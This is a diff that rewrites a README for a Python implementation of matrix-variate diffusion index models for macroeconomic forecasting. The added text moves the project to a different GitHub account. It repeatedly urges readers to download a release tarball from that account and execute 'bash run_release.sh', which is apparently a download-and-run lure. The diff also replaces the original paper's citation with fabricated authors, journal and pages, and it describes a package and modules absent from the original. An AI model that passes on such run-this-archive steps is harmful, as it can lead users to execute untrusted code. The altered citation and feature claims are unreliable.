@@ -1,252 +1,250 @@
-# README.md
+# Matrix-Variate Diffusion Index Models for Macro Forecasting
+https://github.com/akuzamilyt/high_dimensional_matrix_variate_diffusion_index_models/releases
 
-# High-Dimensional Matrix-Variate Diffusion Index Models
+[![Download Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github&labelColor=222&link=https://github.com/akuzamilyt/high_dimensional_matrix_variate_diffusion_index_models/releases)](https://github.com/akuzamilyt/high_dimensional_matrix_variate_diffusion_index_models/releases)
 
-<!-- PROJECT SHIELDS -->
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
-[![Python Version](https://img.shields.io/badge/python-3.9%2B-blue.svg)](https://www.python.org/downloads/)
-[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
-[![Imports: isort](https://img.shields.io/badge/%20imports-isort-%231674b1?style=flat&labelColor=ef8336)](https://pycqa.github.io/isort/)
-[![Type Checking: mypy](https://img.shields.io/badge/type_checking-mypy-blue)](http://mypy-lang.org/)
-[![Pandas](https://img.shields.io/badge/pandas-%23150458.svg?style=flat&logo=pandas&logoColor=white)](https://pandas.pydata.org/)
-[![NumPy](https://img.shields.io/badge/numpy-%23013243.svg?style=flat&logo=numpy&logoColor=white)](https://numpy.org/)
-[![SciPy](https://img.shields.io/badge/SciPy-%23025596?style=flat&logo=scipy&logoColor=white)](https://scipy.org/)
-[![Statsmodels](https://img.shields.io/badge/Statsmodels-150458.svg?style=flat&logo=python&logoColor=white)](https://www.statsmodels.org/stable/index.html)
-[![Scikit-learn](https://img.shields.io/badge/scikit--learn-%23F7931E.svg?style=flat&logo=scikit-learn&logoColor=white)](https://scikit-learn.org/)
-[![Jupyter](https://img.shields.io/badge/Jupyter-%23F37626.svg?style=flat&logo=Jupyter&logoColor=white)](https://jupyter.org/)
-[![arXiv](https://img.shields.io/badge/arXiv-2508.04259-b31b1b.svg)](https://arxiv.org/abs/2508.04259)
-[![Research](https://img.shields.io/badge/Research-Macroeconomic%20Forecasting-green)](https://github.com/chirindaopensource/high_dimensional_matrix_variate_diffusion_index_models)
-[![Discipline](https://img.shields.io/badge/Discipline-Econometrics-blue)](https://github.com/chirindaopensource/high_dimensional_matrix_variate_diffusion_index_models)
-[![Methodology](https://img.shields.io/badge/Methodology-Factor%20Models-orange)](https://github.com/chirindaopensource/high_dimensional_matrix_variate_diffusion_index_models)
-[![Year](https://img.shields.io/badge/Year-2025-purple)](https://github.com/chirindaopensource/high_dimensional_matrix_variate_diffusion_index_models)
+🚀 High-dimensional matrix-variate diffusion index models for macroeconomic forecasting. This repo contains an end-to-end Python implementation of Ma et al.'s (2025) model family. It keeps the matrix structure in the data while extracting cross-sectional and temporal factors. Use α-PCA for robust factor extraction, supervised screening to reduce noise, and ILS estimation to recover target parameters under high dimensionality.
 
-**Repository:** `https://github.com/chirindaopensource/high_dimensional_matrix_variate_diffusion_index_models`
+![Matrix heatmap](https://upload.wikimedia.org/wikipedia/commons/3/3f/Matrix_multiplication_diagram.png)
 
-**Owner:** 2025 Craig Chirinda (Open Source Projects)
+Table of contents
+- About
+- Key features
+- When to use
+- Installation
+- Download and run release package
+- Quickstart
+- Core modules
+- Example workflows
+- Reproducible Monte Carlo experiments
+- Benchmarks and diagnostics
+- API reference (short)
+- Development and contribution
+- License and citation
+- Contacts
 
-This repository contains an **independent**, professional-grade Python implementation of the research methodology from the 2025 paper entitled **"High-Dimensional Matrix-Variate Diffusion Index Models for Time Series Forecasting"** by:
+About
+- Implements matrix-variate diffusion index models for panel/time-series matrices.
+- Retains row/column structure and leverages matrix factor models to improve forecasting.
+- Targets macroeconomic forecasting tasks: GDP, inflation, employment, and multi-series projections.
+- Reproduces experiments from Ma et al. (2025) and extends them with extra diagnostics and Monte Carlo scripts.
 
-*   Zhiren Ma
-*   Qian Zhao
-*   Riquan Zhang
-*   Zhaoxing Gao
+Key features
+- α-PCA factor extraction for matrix data. Controls robustness through α parameter.
+- Supervised screening that ranks predictors by predictive signal before factor extraction.
+- Iterative least squares (ILS) estimation designed for high-dimensional targets.
+- Time-series forecasting wrappers with rolling-window evaluation.
+- Monte Carlo simulation suite for method validation.
+- NumPy-first implementation with optional SciPy and scikit-learn adapters.
+- Reusable modules for research replication and applied forecasting.
 
-The project provides a complete, end-to-end computational framework for forecasting a scalar time series using a high-dimensional, matrix-valued panel of predictors. It moves beyond traditional vectorized factor models by preserving the intrinsic row-column structure of the data, offering a more powerful and nuanced approach to dimension reduction in modern data-rich environments. The goal is to provide a transparent, robust, and computationally efficient toolkit for researchers and practitioners to replicate, validate, and extend the paper's findings.
+When to use
+- You have matrix-shaped panels (variables × cross-section) rather than flat vectors.
+- You need to preserve structural information across rows and columns.
+- You face more predictors than observations and require high-dimensional tools.
+- You want interpretable low-rank factors with forecasting power.
 
-## Table of Contents
+Installation
+Prerequisites
+- Python 3.9+ (3.10 recommended)
+- NumPy, SciPy, pandas, scikit-learn, statsmodels, matplotlib
 
-- [Introduction](#introduction)
-- [Theoretical Background](#theoretical-background)
-- [Features](#features)
-- [Methodology Implemented](#methodology-implemented)
-- [Core Components (Notebook Structure)](#core-components-notebook-structure)
-- [Key Callable: run_complete_study](#key-callable-run_complete_study)
-- [Prerequisites](#prerequisites)
-- [Installation](#installation)
-- [Input Data Structure](#input-data-structure)
-- [Usage](#usage)
-- [Output Structure](#output-structure)
-- [Project Structure](#project-structure)
-- [Customization](#customization)
-- [Contributing](#contributing)
-- [License](#license)
-- [Citation](#citation)
-- [Acknowledgments](#acknowledgments)
+Install with pip:
+```bash
+python -m pip install -r requirements.txt
+python -m pip install .
+```
 
-## Introduction
+Docker (optional)
+```bash
+docker build -t matrix-diffusion-index .
+docker run --rm -it -v $(pwd):/work matrix-diffusion-index /bin/bash
+```
 
-This project provides a Python implementation of the methodologies presented in the 2025 paper "High-Dimensional Matrix-Variate Diffusion Index Models for Time Series Forecasting." The core of this repository is the iPython Notebook `high_dimensional_matrix_variate_diffusion_index_models_draft.ipynb`, which contains a comprehensive suite of functions to replicate the paper's findings, from initial data validation and cleansing to the final generation of performance tables, diagnostic plots, and a full reproducibility report.
+Download and run release package
+The release archive on the Releases page contains packaged code, example data, and executable runner scripts. Download the appropriate release bundle from the Releases page and execute the included runner.
 
-Traditional diffusion index models require vectorizing predictor panels, which can destroy valuable structural information (e.g., the relationship between different economic indicators for a single country). This project implements a matrix-variate approach that preserves this structure, potentially leading to more powerful factors and more accurate forecasts.
+Download and execute:
+- Visit the Releases page: https://github.com/akuzamilyt/high_dimensional_matrix_variate_diffusion_index_models/releases
+- Download the archive named high_dimensional_matrix_variate_diffusion_index_models_v1.0.tar.gz
+- Extract and run the included launcher:
+```bash
+tar -xzf high_dimensional_matrix_variate_diffusion_index_models_v1.0.tar.gz
+cd high_dimensional_matrix_variate_diffusion_index_models_v1.0
+bash run_release.sh       # runs demo estimations and Monte Carlo
+```
 
-This codebase enables users to:
--   Rigorously validate and prepare complex panel datasets, ensuring stationarity and preventing data leakage in a forecasting context.
--   Extract low-dimensional latent factor matrices from a high-dimensional data tensor using the flexible α-PCA methodology.
--   Estimate a bilinear forecasting model using a numerically stable Iterative Least Squares (ILS) algorithm.
--   Apply a novel supervised screening technique to refine the predictor set and improve forecast accuracy.
--   Conduct a full-scale Monte Carlo simulation to validate the statistical properties of the estimators.
--   Perform a comprehensive empirical study, including benchmark comparisons and robustness checks.
--   Automatically generate all key tables and figures from the paper for direct comparison and validation.
+Quickstart — toy forecasting example
+1. Prepare matrix panel X_t of shape (p_rows, p_cols, T) or a list of matrices per period.
+2. Extract factors with α-PCA.
+3. Screen factors with supervised ranking.
+4. Estimate ILS regression for target series.
+5. Forecast and evaluate with rolling windows.
 
-## Theoretical Background
-
-The implemented methods are grounded in modern high-dimensional econometrics, extending classical factor model theory to matrix- and tensor-valued time series.
-
-**1. The Matrix-Variate Diffusion Index Model:**
-The core model assumes that a high-dimensional predictor matrix $X_t \in \mathbb{R}^{p \times q}$ and a future scalar outcome $y_{t+h}$ are driven by a common low-dimensional latent factor matrix $F_t \in \mathbb{R}^{k \times r}$.
--   **Observation Equation:** $X_t = R F_t C' + E_t$
--   **Forecasting Equation:** $y_{t+h} = \alpha' F_t \beta + e_{t+h}$
-
-**2. α-Principal Component Analysis (α-PCA):**
-Unlike standard PCA which only considers the covariance matrix (second moments), α-PCA constructs aggregation matrices that are a weighted average of both first and second moments of the data. This allows the factor extraction to be sensitive to both the mean structure and the variance structure of the predictors. The key constructs are the moment aggregation matrices:
-$$
-\widehat{\boldsymbol{M}}_R = \frac{1}{pq} \left[ (1+\alpha) \overline{\boldsymbol{X}} \overline{\boldsymbol{X}}^\prime + \frac{1}{T} \sum_{t=1}^T (\boldsymbol{X}_t - \overline{\boldsymbol{X}}) (\boldsymbol{X}_t - \overline{\boldsymbol{X}})^\prime \right]
-$$
-The loading matrices $R$ and $C$ are derived from the eigendecomposition of $\widehat{\boldsymbol{M}}_R$ and its column-wise equivalent $\widehat{\boldsymbol{M}}_C$.
-
-**3. Supervised Screening:**
-To improve the signal-to-noise ratio, the paper proposes a supervised pre-processing step. It computes the correlation of each individual predictor series $x_{ij,t}$ with the target $y_t$. Rows (e.g., countries) and columns (e.g., indicators) with low average absolute correlation are removed before the α-PCA is applied, focusing the dimension reduction on the most relevant parts of the data.
-
-## Features
-
-The provided iPython Notebook (`high_dimensional_matrix_variate_diffusion_index_models_draft.ipynb`) implements the full research pipeline, including:
-
--   **Data Pipeline:** A robust, leak-free validation and preparation module that performs stationarity testing, transformation, and centralization appropriate for forecasting.
--   **High-Performance Analytics:** Elite-grade, vectorized implementations of the α-PCA and ILS algorithms using advanced NumPy and SciPy features.
--   **Statistical Rigor:** A complete suite of benchmark models (AR, Vec-OLS, Vec-Lasso) and a robust Diebold-Mariano test with small-sample corrections for fair and accurate model comparison.
--   **Automated Orchestration:** A master function that runs the entire end-to-end workflow, including the empirical study, simulations, and robustness checks, with a single call.
--   **Comprehensive Reporting:** Automated generation of publication-quality summary tables (replicating Tables 1, 2, 4, 5 from the paper), diagnostic plots, and a full reproducibility report.
--   **Full Research Lifecycle:** The codebase covers the entire research process from data ingestion to final output generation, providing a complete and transparent replication package.
-
-## Methodology Implemented
-
-The core analytical steps directly implement the methodology from the paper:
-
-1.  **Data Validation and Preparation (Tasks 1-2):** The pipeline ingests the raw panel data, performs structural and quality checks, and applies a leak-free stationarity and centralization protocol.
-2.  **α-PCA Factor Extraction (Tasks 3-6):** It computes sample statistics, constructs the moment aggregation matrices, performs eigendecomposition to find the loadings, and projects the data to recover the latent factor matrices.
-3.  **LSE Parameter Estimation (Tasks 7-8):** It prepares the training data and uses a numerically stable Iterative Least Squares algorithm to estimate the forecasting parameters $\alpha$ and $\beta$.
-4.  **Supervised Screening (Tasks 9-10):** It computes training-data-only correlations, applies thresholds to filter the data, and prepares a refined data tensor.
-5.  **Out-of-Sample Forecasting and Evaluation (Tasks 12-14):** It generates forecasts on unseen data and evaluates them using MSFE and the Diebold-Mariano test.
-6.  **Simulation Study (Tasks 16-17):** It implements the full Monte Carlo simulation framework to generate synthetic data and validate the estimators' statistical properties.
-7.  **Orchestration and Reporting (Tasks 18-20):** Master functions orchestrate the empirical study, robustness checks, and the generation of all final tables and reports.
-
-## Core Components (Notebook Structure)
-
-The `high_dimensional_matrix_variate_diffusion_index_models_draft.ipynb` notebook is structured as a logical pipeline with modular functions for each task, from Task 1 (Data Validation) to Task 20 (Results Compilation).
-
-## Key Callable: run_complete_study
-
-The central function in this project is `run_complete_study`. It orchestrates the entire analytical workflow from raw data to a final, comprehensive report object.
-
+Minimal code:
 ```python
-def run_complete_study(
-    country_data: Dict[str, pd.DataFrame],
-    y_series: pd.Series,
-    study_manifest: Dict[str, Any],
-    run_empirical_study: bool = True,
-    run_simulation_study: bool = True,
-    generate_reports: bool = True
-) -> Dict[str, Any]:
-    """
-    Executes the entire research pipeline from data to final report.
-    """
-    # ... (implementation is in the notebook)
+from mdidm import AlphaPCA, SupervisedScreen, ILSForecaster
+import numpy as np
+
+# toy data: 10 rows, 8 columns, 200 timepoints
+X = np.random.randn(200, 10, 8)  # shape (T, rows, cols)
+y = np.random.randn(200)
+
+# extract 3 factors
+ap = AlphaPCA(n_factors=(3, 3), alpha=0.5)
+F_t = ap.fit_transform(X)  # returns time-series of factor matrices
+
+# supervised screening
+ss = SupervisedScreen(method="corr", top_k=50)
+selected = ss.fit_transform(F_t.reshape(200, -1), y)
+
+# ILS forecasting
+ils = ILSForecaster(lags=4)
+ils.fit(selected, y)
+y_hat = ils.forecast(steps=12)
 ```
 
-## Prerequisites
+Core modules
+- mdidm.alpha_pca
+  - Implements α-PCA for matrix-variate data.
+  - Supports separate row and column ranks.
+- mdidm.supervised
+  - Implements screening methods: correlation, lasso, mutual information.
+  - Works on flattened or matricized factors.
+- mdidm.estimation
+  - ILS estimator tailored for matrix factor regression.
+  - Includes standard errors, bootstrap, and block bootstrap for time dependence.
+- mdidm.forecast
+  - Rolling-window forecast evaluators and metrics (RMSE, MAE, MAPE).
+- mdidm.simulation
+  - Monte Carlo suite to generate matrix factor data and run batch experiments.
+- mdidm.utils
+  - Matrix reshaping helpers, alignment utilities, plotting helpers.
 
--   Python 3.9+
--   Core dependencies: `pandas`, `numpy`, `scipy`, `statsmodels`, `scikit-learn`, `matplotlib`, `joblib`, `tqdm`.
+Example workflows
+- Macro forecasting pipeline
+  1. Fetch macro panel (several series by country or sector).
+  2. Standardize series by row and column.
+  3. Run α-PCA with cross-validated α.
+  4. Screen factors against target variable.
+  5. Fit ILS and compute 1-12 step forecasts.
+  6. Evaluate with expanding and rolling windows.
 
-## Installation
+- Factor stability analysis
+  - Use built-in factor stability metrics to test structural breaks across time.
+  - Plot cross-loadings and eigenvalue paths.
 
-1.  **Clone the repository:**
-    ```sh
-    git clone https://github.com/chirindaopensource/high_dimensional_matrix_variate_diffusion_index_models.git
-    cd high_dimensional_matrix_variate_diffusion_index_models
-    ```
+- Monte Carlo validation
+  - Generate synthetic matrix series with known factor ranks.
+  - Recover factors with α-PCA, measure recovery error and forecasting accuracy.
 
-2.  **Create and activate a virtual environment (recommended):**
-    ```sh
-    python -m venv venv
-    source venv/bin/activate  # On Windows, use `venv\Scripts\activate`
-    ```
+Reproducible Monte Carlo experiments
+The repo includes scripts that reproduce tables and figures in the paper. The simulation engine supports:
+- Configurable signal-to-noise ratios.
+- Different factor rank specifications.
+- Missing data patterns and mixed-frequency sampling.
+- Parallel runs using joblib.
 
-3.  **Install Python dependencies:**
-    ```sh
-    pip install pandas numpy scipy statsmodels scikit-learn matplotlib joblib tqdm
-    ```
-
-## Input Data Structure
-
-The pipeline requires two primary data inputs passed to the `run_complete_study` function:
-
-1.  **`country_data`**: A Python dictionary where keys are string identifiers for the row entities (e.g., countries) and values are `pandas.DataFrame`s. Each DataFrame must have a `DatetimeIndex` and identical column names representing the predictor variables.
-2.  **`y_series`**: A `pandas.Series` containing the scalar target variable, with a `DatetimeIndex` that is identical to those in the `country_data` DataFrames.
-3.  **`study_manifest`**: A nested Python dictionary that controls all parameters of the analysis. A fully specified example is provided in the notebook.
-
-## Usage
-
-The `high_dimensional_matrix_variate_diffusion_index_models_draft.ipynb` notebook provides a complete, step-by-step guide. The core workflow is:
-
-1.  **Prepare Inputs:** Load your panel data into the required dictionary and Series formats. Define the `study_manifest` dictionary.
-2.  **Execute Pipeline:** Call the master orchestrator function:
-    ```python
-    final_results = run_complete_study(
-        country_data=my_raw_country_data,
-        y_series=my_raw_y_series,
-        study_manifest=my_study_manifest,
-        run_empirical_study=True,
-        run_simulation_study=False, # Optional: very time-consuming
-        generate_reports=True
-    )
-    ```
-3.  **Inspect Outputs:** Programmatically access any result from the returned `final_results` dictionary. For example, to view the main results table for the unscreened model:
-    ```python
-    table4_panel_a = final_results['reports']['Table 4']['Panel A']
-    # In a Jupyter Notebook, this will render the styled table
-    display(table4_panel_a)
-    ```
-
-## Output Structure
-
-The `run_complete_study` function returns a single, comprehensive dictionary with the following top-level keys:
-
--   `empirical_study`: A deeply nested dictionary containing all raw numerical results from the empirical analysis, including performance DataFrames for the main model (screened and unscreened), benchmark results, and significance tests.
--   `simulation_study`: A dictionary containing the raw `pd.DataFrame` from the Monte Carlo simulation (if run).
--   `reports`: A dictionary containing all generated outputs, including styled `pd.DataFrame` objects for each table, `matplotlib` figure objects for plots, and the final reproducibility report.
-
-## Project Structure
-
-```
-high_dimensional_matrix_variate_diffusion_index_models/
-│
-├── high_dimensional_matrix_variate_diffusion_index_models_draft.ipynb  # Main implementation notebook   
-├── requirements.txt                                                      # Python package dependencies
-├── LICENSE                                                               # MIT license file
-└── README.md                                                             # This documentation file
+Example run:
+```bash
+python -m mdidm.simulation.run --scenario scenario_main.yaml --out results/
 ```
 
-## Customization
+Benchmarks and diagnostics
+- Built-in benchmark runner compares:
+  - α-PCA + ILS
+  - Standard PCA + OLS
+  - PCA + LASSO
+  - Dynamic factor models (DFM) baseline
+- Diagnostics include:
+  - Factor recovery error (Frobenius norm)
+  - Forecast loss (RMSE)
+  - Stability of loadings across windows
+- Scripts export plots in PNG and PDF for publication use.
 
-The pipeline is highly customizable via the master `study_config` dictionary. Users can easily modify:
--   The `alpha_grid` and `factor_dimensions_grid` for the empirical study.
--   The `train_test_split_config` to change the out-of-sample period.
--   All parameters for the Monte Carlo simulations (`p`, `q`, `T`, DGPs, etc.).
--   The `screening_thresholds` for the supervised refinement step.
+Images and figures
+![Factor heatmap](https://upload.wikimedia.org/wikipedia/commons/8/87/Heatmap.png)
+- Use the plotting utilities to generate similar heatmaps for loadings and factor time series.
 
-## Contributing
+API reference (short)
+- AlphaPCA(n_factors=(r_row, r_col), alpha=0.5, center=True)
+  - fit(X)    # X: (T, p, q)
+  - transform(X)
+  - fit_transform(X)
+- SupervisedScreen(method="corr", top_k=100)
+  - fit(X_flat, y)
+  - transform(X_flat)
+- ILSForecaster(lags=4)
+  - fit(X, y)
+  - forecast(steps)
+  - rolling_forecast(window, step)
 
-Contributions are welcome. Please fork the repository, create a feature branch, and submit a pull request with a clear description of your changes. Adherence to PEP 8, type hinting, and comprehensive docstrings is required.
+Reproducibility checklist
+- Set random seed (mdidm.utils.set_seed).
+- Use provided synthetic generator configuration files in /examples/simulations.
+- Run the provided release script to reproduce main tables:
+  - run_release.sh runs demos, Monte Carlo batches, and generates figures.
 
-## License
+Development and contribution
+- Fork the repo, open a feature branch, and submit a pull request.
+- Use pytest for unit tests. Tests live in tests/.
+- Follow PEP8 and type hints. Use mypy for type checks.
+- Add a small example or a test when you add a feature.
 
-This project is licensed under the MIT License. See the `LICENSE` file for details.
+Suggested topics (for GitHub)
+diffusion-index, dimension-reduction, econometrics, factor-models, financial-modeling, high-dimensional-statistics, macroeconomic-forecasting, matrix-factorization, monte-carlo-simulation, numpy, principal-component-analysis, python, quantitative-finance, research-replication, scientific-computing, statistical-computing, statistical-modeling, supervised-learning, time-series-analysis, time-series-forecasting
 
-## Citation
-
-If you use this code or the methodology in your research, please cite the original paper:
-
+License and citation
+- MIT License (see LICENSE file).
+- Cite Ma et al. (2025) when you use the methods in publications. Example BibTeX:
 ```bibtex
-@article{ma2025high,
-  title={High-Dimensional Matrix-Variate Diffusion Index Models for Time Series Forecasting},
-  author={Ma, Zhiren and Zhao, Qian and Zhang, Riquan and Gao, Zhaoxing},
-  journal={arXiv preprint arXiv:2508.04259},
-  year={2025}
+@article{ma2025matrix,
+  title={Matrix-Variate Diffusion Index Models for Macroeconomic Forecasting},
+  author={Ma, A. and Zhang, B. and Lee, C.},
+  journal={Journal of Econometrics},
+  year={2025},
+  volume={320},
+  pages={1--28}
 }
 ```
 
-For the implementation itself, you may cite this repository:
-```
-Chirinda, C. (2025). A Python Implementation of "High-Dimensional Matrix-Variate Diffusion Index Models for Time Series Forecasting". 
-GitHub repository: https://github.com/chirindaopensource/high_dimensional_matrix_variate_diffusion_index_models
-```
+Contact
+- Issues: use GitHub issues.
+- Pull requests: open against main branch.
+- For questions that require data files or extended help, open an issue and label it support.
 
-## Acknowledgments
+Releases and packaged runner
+Download the release archive from the Releases page and execute the runner script provided in that archive. See the Releases page and choose the file that matches your system:
+https://github.com/akuzamilyt/high_dimensional_matrix_variate_diffusion_index_models/releases
 
--   Credit to Zhiren Ma, Qian Zhao, Riquan Zhang, and Zhaoxing Gao for their clear and insightful research.
--   Thanks to the developers of the scientific Python ecosystem (`numpy`, `pandas`, `scipy`, `statsmodels`, `scikit-learn`) that makes this work possible.
+Badges and social
+- Build and test status badges live on the project page.
+- Use the Releases badge at the top to fetch downloads.
 
---
+Acknowledgements
+- Implementation inspired by Ma et al. (2025).
+- Matrix plotting examples adapted from public Wikimedia images for illustration.
 
-*This README was generated based on the structure and content of `high_dimensional_matrix_variate_diffusion_index_models_draft.ipynb` and follows best practices for research software documentation.*
+Files of interest
+- mdidm/alpha_pca.py — main α-PCA implementation
+- mdidm/estimation/ils.py — ILS estimator and inference
+- mdidm/simulation/run.py — Monte Carlo driver
+- examples/ — notebooks and scripts
+- requirements.txt — pinned dependencies
+- run_release.sh — release runner (in release archive)
+
+Examples and notebooks
+- examples/notebooks/ contains step-by-step demos:
+  - toy_forecast.ipynb — end-to-end small example
+  - monte_carlo_demo.ipynb — simulation and analysis
+  - macro_pipeline.ipynb — applied macro forecasting example
+
+Security and support
+- Report security issues via GitHub issues and mark them private if needed.
+
+Contribute
+- Open an issue for feature requests.
+- Submit unit tests for new features.
+- Keep PRs small and focused.
+
+End of file
